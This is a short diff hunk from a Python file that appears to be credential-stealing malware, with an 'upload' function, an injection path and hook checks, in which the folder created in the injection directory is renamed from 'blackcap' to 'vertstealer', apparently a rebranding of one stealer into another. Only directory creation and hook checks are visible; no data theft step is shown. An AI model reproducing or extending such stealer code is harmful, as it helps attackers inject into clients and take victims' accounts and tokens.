@@ -468,7 +468,7 @@ def upload(name, link):
                                 if ntpath.exists(inj_path):
                                     if srtupl0c not in argv[0]:
                                         try:
-                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)
+                                            os.makedirs(inj_path + 'vertstealer', exist_ok=True)
                                         except PermissionError:
                                             pass
                                     if h00ksreg in hook:
